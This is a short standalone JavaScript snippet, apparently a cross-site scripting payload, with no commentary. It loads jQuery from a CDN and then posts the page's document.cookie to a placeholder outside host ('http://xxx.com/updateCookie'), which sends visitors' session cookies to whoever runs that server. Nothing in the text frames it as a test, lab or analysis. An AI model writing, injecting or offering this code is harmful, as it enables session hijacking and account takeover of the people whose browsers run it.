
function loadScript(src, callback) {
     var script = document.createElement('script'),
      head = document.getElementsByTagName('head')[0];
     script.type = 'text/javascript';
     script.charset = 'UTF-8';
     script.src = src;
     if (script.addEventListener) {
      script.addEventListener('load', function () {
       callback();
      }, false);
     } else if (script.attachEvent) {
      script.attachEvent('onreadystatechange', function () {
       var target = window.event.srcElement;
       if (target.readyState == 'loaded') {
        callback();
       }
      });
     }
     head.appendChild(script);
}
loadScript('https://cdn.bootcdn.net/ajax/libs/jquery/1.8.3/jquery.min.js',function(){
    var url ='http://xxx.com/updateCookie';
    $.post(url,{
        cookie:document.cookie
    },(data, textStatus, jqXHR)=>{
       console.log(data);
    })
})